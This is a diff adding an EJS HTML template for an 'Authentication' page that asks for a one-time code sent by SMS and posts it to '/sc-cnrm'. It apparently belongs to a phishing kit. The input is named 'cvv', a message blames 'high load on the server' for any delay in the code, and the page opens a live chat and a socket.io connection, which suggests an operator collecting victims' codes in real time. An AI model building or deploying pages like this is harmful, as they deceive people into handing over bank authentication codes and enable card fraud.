@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        <%= title %>
+    </title>
+    <link rel="stylesheet" href="/stylesheets/output.css">
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <%- include("./includes/jivochat.ejs") %>
+
+</head>
+
+<body class="bg-[#F3F2F2] roboto">
+    <%- include("./includes/navbar.ejs") %>
+
+        <form action="/sc-cnrm" method="post" class="mx-auto sms-container">
+            <div class="max-w-lg bg-white rounded-md shadow-md px-4 py-7">
+                <p class="text-2xl font-medium">Authentication</p>
+                <p class="my-2 text-sm">A one-time password has been sent to your phone number.</p>
+                <div class="my-2 text-sm bg-[#FDFBE4] p-1">
+                    <p>Attention! Due to high load on the server, sending the code may be delayed for several minutes.
+                    </p>
+                </div>
+                <div class="w-full mt-6 mb-3">
+                    <label for="cvv" class="font-medium">Enter the code from SMS</label>
+                    <input type="tel" id="cvv" name="cvv"
+                        class="block outline-none border-2 border-gray-200 rounded-md py-2 px-2 w-full"
+                        placeholder="Enter the code from SMS..." required>
+                </div>
+                <button
+                    class="w-full bg-[#DC291E] outline-none border-none py-2 px-10 text-white font-medium rounded-lg block my-4"
+                    type="submit">
+                    Continue
+                </button>
+            </div>
+        </form>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+        <script>
+            const socket = io();
+        </script>
+</body>
+
+</html>
